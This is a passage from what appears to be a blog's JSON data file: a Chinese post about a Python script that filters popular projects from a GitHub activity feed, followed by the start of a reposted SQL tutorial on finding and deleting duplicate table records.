11:36:26\npermalink: github3k\ntags: Github\ncategories: Github\ntop: true\n\n---\n# 前言\n16天前，写了一个小python程序，自动关注Github里的人，python真是尤物，能快速麻出想做的程序。\n\n于是乎我利用这个关注了3万人的Github，可是关注后~~除了同性交友~~似乎没有什么用，而我发现一件事，就是我的首页动态变化如同刷新浪微博一样，每个人都在star或fork各种项目，不乏很多精品资源。\n<!-- more --> \n![](/content/images/githubauto/1.jpg)\n\n翻都翻不过来，那么同时还存在一些“无用( ~~垃圾~~ )项目”，star和fork数量很少，点开没有意义。那么能否写一个python小程序，把“高质量”的项目来源于好友follow的项目都爬出来呢？\n\n经过短暂的编码，``GithubAwesome.py``诞生了。\n\n现在进入[AutoGithub](https://github.com/yfgeek/AutoGithub)项目就可以看到GithubAwesome.py项目\n\n# 规则\n\n设置一个规则，如果关注的人的动态里刷出来的项目 star数量 大于 最少 star  或 大于 最少 fork，那么就把他输出出来。\n\n举个🌰\n```\n最少 star 数: 50\n最少 fork 数: 50\n```\n\n效果如图\n\n![](/content/images/githubauto/awesomesnap.png)\n\n# 配置\n\n首先，确保你安装了``beautifulsoup4``.\n\n```\npip install beautifulsoup4\n```\n然后编辑``GithubAwesome.py``文件，请原谅如此土的方式。\n```python\nga = GithubAwesome('username','password')\n# login\nga.login()\nga.get_awesome(1,20,50) # 第一页 规则 min star 20 min or fork 20\n```\n# 写在最后\n\n当你关注超过1K的用户，你会感叹，每天都有精品项目推送的感觉，真好！😁","slug":"github3k","published":1,"updated":"2016-11-26T02:24:56.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"civym30120012cdonqr1a0dlh","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>16天前，写了一个小python程序，自动关注Github里的人，python真是尤物，能快速麻出想做的程序。</p>\n<p>于是乎我利用这个关注了3万人的Github，可是关注后<del>除了同性交友</del>似乎没有什么用，而我发现一件事，就是我的首页动态变化如同刷新浪微博一样，每个人都在star或fork各种项目，不乏很多精品资源。<br><a id=\"more\"></a><br><img src=\"/content/images/githubauto/1.jpg\" alt=\"\"></p>\n<p>翻都翻不过来，那么同时还存在一些“无用( <del>垃圾</del> )项目”，star和fork数量很少，点开没有意义。那么能否写一个python小程序，把“高质量”的项目来源于好友follow的项目都爬出来呢？</p>\n<p>经过短暂的编码，<code>GithubAwesome.py</code>诞生了。</p>\n<p>现在进入<a href=\"https://github.com/yfgeek/AutoGithub\" target=\"_blank\" rel=\"external\">AutoGithub</a>项目就可以看到GithubAwesome.py项目</p>\n<h1 id=\"规则\"><a href=\"#规则\" class=\"headerlink\" title=\"规则\"></a>规则</h1><p>设置一个规则，如果关注的人的动态里刷出来的项目 star数量 大于 最少 star  或 大于 最少 fork，那么就把他输出出来。</p>\n<p>举个🌰<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">最少 star 数: 50</div><div class=\"line\">最少 fork 数: 50</div></pre></td></tr></table></figure></p>\n<p>效果如图</p>\n<p><img src=\"/content/images/githubauto/awesomesnap.png\" alt=\"\"></p>\n<h1 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h1><p>首先，确保你安装了<code>beautifulsoup4</code>.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">pip install beautifulsoup4</div></pre></td></tr></table></figure>\n<p>然后编辑<code>GithubAwesome.py</code>文件，请原谅如此土的方式。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">ga = GithubAwesome(<span class=\"string\">'username'</span>,<span class=\"string\">'password'</span>)</div><div class=\"line\"><span class=\"comment\"># login</span></div><div class=\"line\">ga.login()</div><div class=\"line\">ga.get_awesome(<span class=\"number\">1</span>,<span class=\"number\">20</span>,<span class=\"number\">50</span>) <span class=\"comment\"># 第一页 规则 min star 20 min or fork 20</span></div></pre></td></tr></table></figure></p>\n<h1 id=\"写在最后\"><a href=\"#写在最后\" class=\"headerlink\" title=\"写在最后\"></a>写在最后</h1><p>当你关注超过1K的用户，你会感叹，每天都有精品项目推送的感觉，真好！😁</p>\n","excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>16天前，写了一个小python程序，自动关注Github里的人，python真是尤物，能快速麻出想做的程序。</p>\n<p>于是乎我利用这个关注了3万人的Github，可是关注后<del>除了同性交友</del>似乎没有什么用，而我发现一件事，就是我的首页动态变化如同刷新浪微博一样，每个人都在star或fork各种项目，不乏很多精品资源。<br>","more":"<br><img src=\"/content/images/githubauto/1.jpg\" alt=\"\"></p>\n<p>翻都翻不过来，那么同时还存在一些“无用( <del>垃圾</del> )项目”，star和fork数量很少，点开没有意义。那么能否写一个python小程序，把“高质量”的项目来源于好友follow的项目都爬出来呢？</p>\n<p>经过短暂的编码，<code>GithubAwesome.py</code>诞生了。</p>\n<p>现在进入<a href=\"https://github.com/yfgeek/AutoGithub\">AutoGithub</a>项目就可以看到GithubAwesome.py项目</p>\n<h1 id=\"规则\"><a href=\"#规则\" class=\"headerlink\" title=\"规则\"></a>规则</h1><p>设置一个规则，如果关注的人的动态里刷出来的项目 star数量 大于 最少 star  或 大于 最少 fork，那么就把他输出出来。</p>\n<p>举个🌰<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">最少 star 数: 50</div><div class=\"line\">最少 fork 数: 50</div></pre></td></tr></table></figure></p>\n<p>效果如图</p>\n<p><img src=\"/content/images/githubauto/awesomesnap.png\" alt=\"\"></p>\n<h1 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h1><p>首先，确保你安装了<code>beautifulsoup4</code>.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">pip install beautifulsoup4</div></pre></td></tr></table></figure>\n<p>然后编辑<code>GithubAwesome.py</code>文件，请原谅如此土的方式。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">ga = GithubAwesome(<span class=\"string\">'username'</span>,<span class=\"string\">'password'</span>)</div><div class=\"line\"><span class=\"comment\"># login</span></div><div class=\"line\">ga.login()</div><div class=\"line\">ga.get_awesome(<span class=\"number\">1</span>,<span class=\"number\">20</span>,<span class=\"number\">50</span>) <span class=\"comment\"># 第一页 规则 min star 20 min or fork 20</span></div></pre></td></tr></table></figure></p>\n<h1 id=\"写在最后\"><a href=\"#写在最后\" class=\"headerlink\" title=\"写在最后\"></a>写在最后</h1><p>当你关注超过1K的用户，你会感叹，每天都有精品项目推送的感觉，真好！😁</p>"},{"title":"SQL重复记录查询（转载）","date":"2016-10-05T18:34:04.000Z","_content":"<div id=\"cnblogs_post_body\"><div><span style=\"font-weight: bold; color: #800000\"><font face=\"Courier New\">&nbsp;1</font></span><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;people<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;例二：</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\"><font color=\"#0000ff\">&nbsp;select</font> * <font color=\"#0000ff\">from</font> testtable</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\"><font color=\"#0000ff\">&nbsp;where</font> numeber in (<font color=\"#0000ff\">select</font> number <font color=\"#0000ff\">from</font> people <font color=\"#0000ff\">group by</font> number <font color=\"#0000ff\">having count</font>(number) &gt; 1 )</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;可以查出testtable表中number相同的记录<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">2</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、删除表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断，只留有rowid最小的记录<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;people&nbsp;<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId&nbsp;)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">3</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录（多个字段）&nbsp;<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">4</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、删除表中多余的重复记录（多个字段），只留有rowid最小的记录<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">5</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录（多个字段），不包含rowid最小的记录<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(二)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">比方说<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">在A表中存在一个字段“name”，<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">而且不同记录之间的“name”值有可能会相同，<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">现在就是需要查询出在该表中的各记录之间，“name”值存在重复的项；<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">Select</span><span style=\"color: #000000\">&nbsp;Name,</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">From</span><span style=\"color: #000000\">&nbsp;A&nbsp;</span><span style=\"color: #0000ff\">Group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">By</span><span style=\"color: #000000\">&nbsp;Name&nbsp;</span><span style=\"color: #0000ff\">Having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">如果还查性别也相同大则如下:<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">Select</span><span style=\"color: #000000\">&nbsp;Name,sex,</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">From</span><span style=\"color: #000000\">&nbsp;A&nbsp;</span><span style=\"color: #0000ff\">Group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">By</span><span style=\"color: #000000\">&nbsp;Name,sex&nbsp;</span><span style=\"color: #0000ff\">Having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(三)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">方法一<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">declare</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #000000\">integer</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #000000\">integer</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">declare</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">cursor</span><span style=\"color: #000000\">&nbsp;local&nbsp;</span><span style=\"color: #0000ff\">for</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;主字段,</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;表名&nbsp;</span><span style=\"color: #0000ff\">group</span><span 